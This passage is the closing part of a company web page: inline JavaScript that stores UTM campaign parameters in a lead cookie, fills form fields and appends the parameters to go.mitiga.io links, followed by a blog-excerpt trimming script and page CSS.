    function getAllUrlParams(url) {
      let obj = Object.fromEntries(new URLSearchParams(location.search));
      return obj;
    }
    /* Check if Lead Cookie already exist */
    var cookieExist = Cookies.get('Mitiga_Lead'); // => if false return undefined
    /* get URL params object */
    var getAllUrlParams = getAllUrlParams(); // return object
    /*Convert a JavaScript object into a string */
    var getAllUrlParamsJSON = JSON.stringify(getAllUrlParams);
    /* Check if the url with utm_parameters */
    let isEmpty = jQuery.isEmptyObject(getAllUrlParams); // return true/false
    
    function createLead(){
        var lead = {
          parameters: getAllUrlParams
        };
        Cookies.set('Mitiga_Lead', lead, { });
        Cookies.set('Mitiga_Marketo_Lead', lead, { domain: 'mitiga.io' });
    }
    
    //check if this utm url equal to the current values of cookie lead
    function is_this_utm_equal_to_cookie_utm_values(){
      for (const this_utm_element of my_utmParameters) {
          if( this_utm_element !== undefined ){
            let value_exist = false;

            if( cookieExist !== undefined ){
              let value_exist = JSON.parse(cookieExist).parameters[this_utm_element] == getAllUrlParams[this_utm_element];
            }

            if(value_exist == false){
              return false;
            }
          }
      }
      return true;
    }
    
    function setUTMformValues(){
        /* the value if the param is empty */
        const empty_param_case = "null";
        /* set feilds */
        for (const this_utm_element of my_utmParameters) {
          set_utm_feild(this_utm_element);
        }
        
        /* inner function */
        function set_utm_feild(utm_type){
            let utm_value = JSON.parse(Cookies.get('Mitiga_Lead')).parameters[utm_type];
            let utm_key = utm_type.replace("_", "");
            let utm_field = jQuery('input[name="'+ utm_key +'"]' );

            //update utm field
            if( utm_field.length > 0){
              utm_field.val(utm_value);
            }
        }// end inner set_utm_feild function */
    }
  
    //Case 1 - if the page with parameters & no cockie exsist
    if(!isEmpty && cookieExist === undefined){
      //Set lead object for the cookies
      createLead();
      setUTMformValues();
    }

    let compare = is_this_utm_equal_to_cookie_utm_values();  
  
    if(!isEmpty && cookieExist !== undefined){
      /* it this utm params diff from current lead values create new lead*/
      if(!compare){
        //Case 3 - lead Exist, but with diff params
        Cookies.remove('Mitiga_Lead');
        createLead();
        setUTMformValues();
      }else{
        //Case 2 - lead exsist with this params
        setUTMformValues();
      }
    }
    
    /* Case 4 - cookie Exist but page without any utm param */
    if(isEmpty && cookieExist !== undefined){
      setUTMformValues();
    }

    //append urlParameters for all go.mitiga.io links
    jQuery('.btn-go-mitiga').each(function(){
      $href = jQuery(this).attr('href');
      $hostname = $href;
      $go_mitiga = 'go.mitiga.io';
      $new_url = $href;

      if ($href.indexOf($go_mitiga) >= 0){
        $utm_params = JSON.parse(Cookies.get('Mitiga_Lead')).parameters;
       
        if( $utm_params !== undefined ){
          var i = 0;
          jQuery.each($utm_params, function(key, value) {
            if( i == 0) {
              $new_url = $new_url + '?'+ key +'='+value;
            }else {
              $new_url = $new_url + '&'+ key +'='+value;
            }
            i++;
          }); 

          //update button url
          jQuery(this).attr('href',$new_url);
        }
      }
    });
</script>

<!-- Blog excerpt change length .... -->
<script type="text/javascript">
jQuery(".blog-summary").each(function (i) {
    var limit = 20;
    var text = jQuery( this ).text();
    text = text.split(" ").splice(0, limit).join(" ");
    
    jQuery( this ).text( text + "..." );
});
</script><style>

figcaption {
	font-size: 14px;
  padding-bottom: 5px;
  font-weight: 500;
  border: 0.5px solid #F4F2F9;
  background-color: #FBFBFD;
  font-size: 14px;
  font-weight: 400;
  color: #78787A;
}

a{
    word-break: break-word;
}

em{
font-size:16px;
}

p {
    word-break: break-word;
}

@media(max-width:767px){
	.w-richtext figure{
  	max-width:100%;
  }
}
</style></body></html>